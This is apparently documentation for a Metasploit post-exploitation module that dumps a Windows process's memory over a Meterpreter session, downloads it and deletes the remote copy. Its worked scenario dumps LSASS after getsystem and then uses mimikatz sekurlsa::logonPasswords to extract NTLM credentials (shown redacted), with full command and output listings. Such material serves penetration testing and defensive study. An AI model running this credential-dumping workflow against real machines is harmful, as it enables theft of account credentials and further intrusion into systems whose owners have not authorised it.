## Vulnerable Application

This module dumps the memory for any process on the system and retrieves it for later analysis.
The user must have sufficient permissions to read the memory of that process. Low-privilege users
should be able to read any of their own processes. High-privilege users should be able to read
any unprotected process.

This module only works on a Meterpreter session on Windows.

## Verification Steps

  1. Start `msfconsole`
  1. Get meterpreter session on a Windows host
  1. Do: `use post/windows/gather/memory_dump`
  1. Do: `set SESSION <session id>`
  1. Do: `set PID <process id>`
  1. Do: `set DUMP_PATH <path on remote system>`
  1. Do: `set DUMP_TYPE <standard|full>`
  1. Do: `run`
  1. You should be able to see that the module has dumped the process to a file and starts downloading it.
  1. You should be able to see, whether the module succeeds or fails, that the file on the remote system has been deleted.

## Options

### DUMP_PATH

The path that the memory dump will be temporarily stored at. This file is then
downloaded and deleted at the end of the run. This file should be in a writable
location, and should not already exist.

### PID

The ID of the process to dump. To find the PID, in your Meterpreter session,
type `ps`. To find a process by name, type `ps | <process name>`.

### DUMP_TYPE

Two options are provided for creating a memory dump:

- Full

This option retrieves the entire memory address space, including all DLLs, EXEs
and memory mapped files. For dumping LSASS for offline analysis, this option
seems to be preferable. However, the file size can be significantly larger than
the Standard option.

- Standard

This option retrieves most data from the process, with the exception of DLLs,
EXEs and memory mapped files. As a result, some analysis tools may have trouble
with automated analysis, however any sensitive information such as passwords
which are stored in memory should be part of this dump. This data could
possibly be retrieved using a tool such as `strings`. The file size should be
significantly smaller than the Full option.

## Scenarios

**Dumping lsass**

Retrieving lsass (after getsystem)

```
meterpreter > ps | lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User                 Path
 ---  ----  ----       ----  -------  ----                 ----
 700  536   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > 
Background session 4? [y/N]  
msf6 post(windows/gather/memory_dump) > set pid 700
pid => 700
msf6 post(windows/gather/memory_dump) > run

[*] Running module against DemoPC
[*] Dumping memory for lsass.exe
[*] Downloading minidump (5.31 MiB)
[+] Memory dump stored at /home/user/.msf4/loot/20210505174955_default_192.168.XXX.XXX_windows.process._647943.bin
[*] Deleting minidump from disk
[*] Post module execution completed
```

Then in mimikatz (offline):

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump c:\Users\user\desktop\20210505175519_default_192.168.XXX.XXX_windows.process._162777.bin
Switch to MINIDUMP : 'c:\Users\user\desktop\20210505175519_default_192.168.XXX.XXX_windows.process._162777.bin'

mimikatz # sekurlsa::logonPasswords
Opening : 'c:\Users\user\desktop\20210505175519_default_192.168.XXX.XXX_windows.process._162777.bin' file for minidump...

Authentication Id : 0 ; 280858 (00000000:0004491a)
Session           : RemoteInteractive from 2
User Name         : user
Domain            : DemoPC
Logon Server      : DemoPC
Logon Time        : 5/05/2021 3:15:10 PM
SID               : S-1-5-21-920577323-754201681-977916534-1001
        msv :
         [00000003] Primary
         * Username : user
         * Domain   : DemoPC
         * NTLM     : (redacted, but verified)
         * SHA1     : (redacted)
        tspkg :
        wdigest :
         * Username : user
         * Domain   : DemoPC
         * Password : (null)
        kerberos :
         * Username : user
         * Domain   : DemoPC
         * Password : (null)
        ssp :
        credman :
        cloudap :
```


